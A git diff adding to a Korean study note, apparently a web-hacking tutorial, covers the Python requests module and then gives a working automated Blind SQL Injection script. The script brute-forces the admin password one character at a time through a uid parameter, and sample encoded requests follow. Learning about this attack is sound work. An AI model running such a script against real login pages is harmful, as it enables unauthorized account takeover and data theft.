@@ -222,6 +222,163 @@ Blind SQL Injection 기법은 한 바이트씩 비교하여 공격하는 방식�
 
 이런 문제를 해결하기 위해서 해결책으로는 공격을 자동화하는 스크립트를 작성하는 방법이 있다.
 
-이러한 자동화 공격 스크립트를 작성하기 위해서 `requests`라는 모듈을 활용할 수 있다.
+이러한 자동화 공격 스크립트를 작성하기 위해서 [requests](https://docs.python-requests.org/en/master/)라는 모듈을 활용할 수 있다.
 
 파이썬은 `HTTP` 통신을 위한 다양한 모듈이 존재하는데, `requests` 모듈은 다양한 메소드를 이용하여 `HTTP Request`를 보내고 응답 또한 확인할 수 있다.
+
+아래 코드는 `requests` 모듈을 통해 `HTTP GET` 메소드 통신을 하는 예제 코드이다.
+
+```
+import requests
+
+url = 'https://dreamhack.io/'
+
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': 'DREAMHACK_REQUEST'
+}
+
+params = {
+    'test': 1,
+}
+
+for i in range(1, 5):
+    c = requests.get(url + str(i), headers=headers, params=params)
+    print(c.request.url)
+    print(c.text)
+```
+
+`requests.get`은 `GET` 메소드를 사용하여 `HTTP Request`를 보내는 함수로 `URL`, `Header`, `Parameter`와 함께 요청을 전송할 수 있다.
+
+참고로, `GET` 메소드의 요청에 담긴 `Parameter`는 `URL`에 담겨서 `?paramter=` 형식으로 전달되므로, 파라미터의 내용이 `URL`에 노출되게 된다.
+
+`print(c.requests.url)`의 출력 값은 `https://dreamhack.io/{1~5}?test=1`이 될 것이며, 
+
+`print(c.text)`는 `HTTP Reqeust`에 대한 응답의 본문 내용을 문자열 형식으로 반환한다. 서버가 클라이언트에 응답하는 `HTML`, `JSON` 또는 다른 형식의 데이터를 포함할 수 있다.
+
+또한 아래 코드는 `requests` 모듈을 통해 `HTTP POST` 메소드 통신을 하는 예제 코드이다.
+
+```
+import requests
+
+url = 'https://dreamhack.io/'
+
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': 'DREAMHACK_REQUEST'
+}
+
+data = {
+    'test': 1,
+}
+
+for i in range(1, 5):
+    c = requests.post(url + str(i), headers=headers, data=data)
+    print(c.text)
+```
+
+`requests.post`는 `POST` 메소드를 사용해 `HTTP Request`를 보내는 함수로 `URL`, `Header`, `Body`와 함께 요청을 전송할 수 있다.
+
+`GET`과의 차이 중 하나는, `URL`에 드러나는 `Parameter` 대신 `HTTP Body`에 포함되는 `data`를 `URL`에 노출하지 않고 전송한다는 것이다.
+
+### 참고 : `GET`, `POST` 차이점
+
+| 분류                  | GET (params)                                  | POST (data)                               |
+|-----------------------|-----------------------------------------------|--------------------------------------------|
+| 전송 위치             | URL 쿼리 문자열                               | HTTP 요청 본문                             |
+| 보안                  | URL에 노출되므로 상대적으로 덜 안전            | URL에 노출되지 않으므로 더 안전             |
+| 데이터 길이 제한      | 있음 (브라우저/서버에 따라 다름)               | 없음 (일반적으로 제한 없음)                |
+| 주 사용 목적          | 데이터 조회, 검색 등 (읽기 전용)               | 데이터 생성, 수정, 삭제 등                 |
+| 캐싱                  | 일반적으로 캐싱됨                             | 캐싱되지 않음                              |
+| Idempotency (멱등성)  | 멱등성 있음                                    | 멱등성 없음 (대부분의 경우)                |
+
+## Blind SQL Injection 자동화 공격 스크립트 작성
+
+`HTTP GET request`로 파라미터를 전달받는 홈페이지에 Blind SQL Injection을 시도한다고 가정해보자. 
+
+로그인 과정에서 사용자에게서 입력되는 아이디와 비밀번호는 출력 가능한 아스키 범위의 문자이기 때문에, Python의 `string` 모듈에 있는 `string.printable`를 이용하여 입력 범위를 지정할 수 있다.
+
+아래의 코드를 한번 살펴보자.
+
+```
+#!/usr/bin/python3
+import requests
+import string
+
+# example URL
+url = 'http://example.com/login'
+
+params = {
+    'uid': '',
+    'upw': ''
+
+}
+# ascii printables
+tc = string.printable
+
+# 사용할 SQL Injection 쿼리
+query = '''admin' and substr(upw,{idx},1)='{val}'-- '''
+password = ''
+
+# 비밀번호 길이는 20자 이하라 가정
+for idx in range(0, 20):
+    for ch in tc:
+        # query를 이용하여 Blind SQL Injection 시도
+        params['uid'] = query.format(idx=idx+1, val=ch).strip("\n")
+        c = requests.get(url, params=params)
+        print(c.request.url)
+        # 응답에 Login success 문자열이 있으면 해당 문자를 password 변수에 저장
+        if c.text.find("Login success") != -1:
+            password += ch
+            break
+print(f"Password is {password}")
+```
+
+먼저, `url`을 정해주고, `params`를 아이디와 비밀번호를 나타내는 `uid`와 `upw`로 지정해준다.
+
+그 후, `tc = string.printable`을 통해 `uid`와 `upw`의 입력 범위를 정해주고, 
+
+공격에 사용할 SQL Injection 쿼리문을 `query = '''admin' and substr(upw,{idx},1)='{val}'-- '''`로 지정해준다. 
+
+`uid` 파라미터로 전달될 쿼리문은 `?uid=admin' and substr(upw, {1~20}, 1) = '{출력 가능한 아스키 문자}' --` 값이 되기 때문에, 반복문을 통해 Blind SQL Injection을 수행하면 `admin` 계정의 비밀번호를 찾을 수 있을 것이다.
+
+### 참고
+
+참고로 여기서 문자열을 지정할 때 `"`로 감싸는게 아닌 `'''`로 감싼 이유는, 문자열 내부에서 `'`가 사용되기 때문이다.
+
+`'` 또는 `"`가 문자열 내부에서 사용될 때는 **Multi-line String**을 지정하는 `'''`를 사용하여 문자열을 감싸주고 내부에서 사용하거나,
+
+이스케이프 문자 `\`를 사용하여 `\'` 또는 `\"`로 쓰면 된다.
+
+그리고 `{idx}`와 `{val}`는 **자리표시자**로, 만약 추가적인 사용 없이 그냥 `query`를 출력하면 문자열 그대로 `{idx}`, `{val}`으로 출력되겠지만, 코드 아래 부분에서처럼 `str.format()`메서드로 해당 자리표시자의 값을 지정해줄 수 있다.
+
+참고로 `f-string`은 자리표시자와 비슷하지만, `str.format()`을 사용하여 동적으로 값을 지정해줄 수 없고, 선언과 함께 문자열이 고정되어서 `idx`와 `val` 변수가 미리 선언되어 있어야 하고, `f-string` 선언 후 `idx`와 `val` 변수에 저장된 값이 바뀌어도 `f-string`에는 적용되지 않는다.
+
+### 다시 돌아와서..
+
+Blind SQL Injection을 통해 찾은 값들을 한 바이트씩 더해줄 수 있도록 `password` 변수를 선언해주고,
+
+비밀번호 길이를 20자로 가정한 후, `tc`의 문자에 대해 하나씩 `params['uid']`에 대입할 파라미터의 값을 `query.format(idx=idx+1, val=ch).strip("\n")`으로 지정해준 후,
+
+`HTTP GET Request`를 발생시킨다.
+
+만약 응답인 `c.text`에 `"Login success"`라는 문자열이 있으면 `-1`이 아닌, 해당 문자열이 처음으로 나타나는 위치의 인덱스 값을 반환하므로 `password`에 현재 비밀번호의 문자인 `ch`를 더해준 후 다음 바이트로 이동하여 비밀번호의 끝자리까지 구해준다.
+
+마지막의 `print(f"Password is {password}")` 부분을 제외하고, 예제 부분에서 `printf(c.request.url)`의 출력 값은 아래와 같을 것이다.
+
+```
+$ python3 bsqli.py
+http://example.com/login?uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%270%27--+&upw=
+http://example.com/login?uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%271%27--+&upw=
+http://example.com/login?uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%272%27--+&upw=
+http://example.com/login?uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%273%27--+&upw=
+http://example.com/login?uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%274%27--+&upw=
+```
+
+특수 문자들을 `URL`에 사용할 수 있도록 인코딩 되어서 위와 같은 형식으로 나오고, `uid` 파라미터에는 지정해준 쿼리문이 잘 전달되고 마지막에 주석인 `--`과 함께 `upw`에는 아무 파라미터도 전달되지 않는 것을 확인할 수 있다.
+
+### 정리
+
+`인젝션`과 `SQL Injection`, 그리고 이를 응용하는 공격 기법인 `Blind SQL Injection`에 대해서 공부해보았다. 
+
+실습 모듈에서는 데이터를 조회하는 `SELECT`만을 사용했지만, `UPDATE`와 `DELETE`에서 SQL Injection이 발생하면 임의 데이터를 갱신하고, 삭제할 수도 있다.
